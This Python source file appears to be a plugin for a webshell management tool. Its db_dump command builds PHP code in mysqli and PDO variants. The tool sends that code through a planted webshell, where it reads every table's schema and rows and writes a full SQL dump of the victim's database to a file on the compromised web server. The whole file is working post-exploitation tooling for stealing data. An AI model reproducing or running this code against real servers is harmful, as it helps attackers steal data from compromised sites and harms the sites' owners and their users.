from libs.config import alias, color, gget
from libs.myapp import send
from webshell_plugins.db_init import get_connect_code


def get_php(database, web_file_path, encoding):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "mysqli"):
        return """function Sqldump(){
$content = "DROP DATABASE IF EXISTS `%s`;\\r\\nCREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET %s;\\r\\nuse `%s`;\\r\\n";
%s
if(!$con){
    die("Connect Error: ".mysqli_connect_error());
}
mysqli_query($con,"set names %s");
$table_list = mysqli_query($con,"show tables");
while($table_data = mysqli_fetch_array($table_list)){
    $table_name = $table_data[0];
    $table_created_data = mysqli_query($con,"show create table `$table_name`");
    $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".mysqli_fetch_array($table_created_data)['Create Table'].";\\r\\n\\r\\n";
    $table_records = mysqli_query($con,"select * from `$table_name`");
    while($record = mysqli_fetch_assoc($table_records)){
        $keys = "`".join('`,`',array_map('addslashes',array_keys($record)))."`";
        $vals = "'".join("','",array_map('addslashes',array_values($record)))."'";
        $content .= "insert into `$table_name`($keys) values($vals);\\r\\n";
    }
    $content .= "\\r\\n";
}
file_put_contents('%s',$content);
}
Sqldump();""" % (database, database, encoding, database, get_connect_code(dbname=database), encoding, web_file_path)
    elif (connect_type == "pdo"):
        return """$content = "DROP DATABASE IF EXISTS `%s`;\\r\\nCREATE DATABASE IF NOT EXISTS `%s` DEFAULT CHARACTER SET %s;\\r\\nuse `%s`;\\r\\n";
try{
%s
} catch (PDOException $e){
die("Connect error: ". $e->getMessage());}
$r=$con->query("set names %s");
$table_list = $con->query("show tables");
$table_data = $table_list->fetchAll(PDO::FETCH_NUM);
foreach ($table_data as $table_names){
    $table_name = $table_names[0];
    $table_created_data = $con->query("show create table `$table_name`");
    $_ = $table_created_data->fetch(PDO::FETCH_ASSOC);
    $v = $_['Create Table'];
    $content .= "DROP TABLE IF EXISTS `$table_name`;\\r\\n".$v.";\\r\\n\\r\\n";
    $table_records = $con->query("select * from `$table_name`");
    while($record = $table_records->fetch(PDO::FETCH_ASSOC)){
        $keys = "`".join('`,`',array_map('addslashes',array_keys($record)))."`";
        $vals = "'".join("','",array_map('addslashes',array_values($record)))."'";
        $content .= "insert into `$table_name`($keys) values($vals);\\r\\n";
    }
    $content .= "\\r\\n";
}
file_put_contents('%s',$content);
""" % (database, database, encoding, database, get_connect_code(dbname=database), encoding, web_file_path)


@alias(True, db="database")
def run(database: str = "", web_file_path: str = "", encoding: str = "utf8"):
    """
    db_dump

    Dump a database to a file, Default file name is {database}.sql.

    eg: db_init {database=current_database} {web_file_path={database}.sql} {encoding="utf-8"}
    """
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    database = database if database else gget("db_dbname", "webshell")
    web_file_path = web_file_path if web_file_path else database + ".sql"
    res = send(get_php(database, web_file_path, encoding))
    if (not res):
        return
    if (not res.r_text and res.status_code == 200):
        print("\n" + color.green(f"Dump {database} to {web_file_path} success") + "\n")
    elif ("Error" in res.r_text):
        print("\n" + color.red(res.r_text.strip()) + "\n")
    else:
        print(color.red("\nError\n"))
